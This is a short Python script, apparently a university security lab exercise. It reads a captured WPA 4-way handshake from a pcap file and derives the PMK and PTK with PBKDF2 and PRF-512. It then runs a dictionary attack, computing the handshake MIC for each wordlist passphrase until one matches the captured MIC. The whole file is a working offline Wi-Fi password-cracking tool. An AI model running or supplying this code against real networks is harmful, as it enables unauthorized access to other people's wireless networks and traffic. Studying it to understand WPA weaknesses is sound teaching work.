#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__ = "Abraham Rubinstein et Yann Lederrey"
__copyright__ = "Copyright 2017, HEIG-VD"
__license__ = "GPL"
__version__ = "1.0"
__email__ = "abraham.rubinstein@heig-vd.ch"
__status__ = "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
import hmac, hashlib


def customPRF512(key, A, B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]


# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa = rdpcap("wpa_handshake.cap")

# Get dictionary for testing passPhrase
with open("wordlist") as f:
    dico = f.readlines()

# Important parameters for key derivation - most of them can be obtained from the pcap file
A           = "Pairwise key expansion" #this string is used in the pseudo-random function
ssid        = wpa[0].info
APmac       = a2b_hex(wpa[5].addr2.replace(':', '')) # Get AP mac address from Source of the first packet of the 4-way handshake
Clientmac   = a2b_hex(wpa[5].addr1.replace(':', '')) # Get STA mac address  from Source of the first packet of the 4-way handshake

# Authenticator and Supplicant Nonces
ANonce      = a2b_hex(b2a_hex(wpa[5].load)[26:90]) # getting nounce in the first packet of the 4-way handshake
SNonce      = a2b_hex(b2a_hex(wpa[6].load)[26:90]) # getting nounce in the second packet of the 4-way handshake

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
mic_to_test = b2a_hex(wpa[8].load)[154:186].decode() # getting MIC from the last (4e) packet of the 4-way handshake

B           = min(APmac, Clientmac)+max(APmac, Clientmac)+min(ANonce, SNonce)+max(ANonce, SNonce) #used in pseudo-random function

data        = a2b_hex("%02x" % wpa[8][5].version +     # add version in 1 Byte hex
                             "%02x" % wpa[8][5].type + # add key type in 1 Byte hex
                             "%04x" % wpa[8][5].len +  # Add len in 2 Byte hex
                             b2a_hex(wpa[8][5].load[:77]).decode().ljust(190, '0')) # Add Key (description + information + len) + Replay counter + Key (Nounce + IV + RSC ID) + padding


for word in dico[745:]:
    # Get one possible passhprase from the dictionary
    passPhrase = str.encode(word[:-1])

    # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)

    # expand pmk to obtain PTK
    ptk = customPRF512(pmk, str.encode(A), B)

    # calculate our own MIC over EAPOL payload - The ptk is, in fact, KCK|KEK|TK|MICK
    mic = hmac.new(ptk[0:16], data, hashlib.sha1)

    # separate ptk into different keys - represent in hex
    KCK = b2a_hex(ptk[0:16])
    KEK = b2a_hex(ptk[16:32])
    TK = b2a_hex(ptk[32:48])
    MICK = b2a_hex(ptk[48:64])

    # the MIC for the authentication is actually truncated to 16 bytes (32 chars). SHA-1 is 20 bytes long.
    MIC_hex_truncated = mic.hexdigest()[0:32]

    # Control if the mic from the dictionary passphrase is the same the one from the passphrase we try to find
    print("%s \t=> MIC: %s" % (passPhrase.decode(), MIC_hex_truncated))

    if MIC_hex_truncated == mic_to_test:
        print("Pass phrase found! It's \"%s\"." % passPhrase.decode())
        exit(0)

print("Pass phrase not found... :(")
exit(-1)
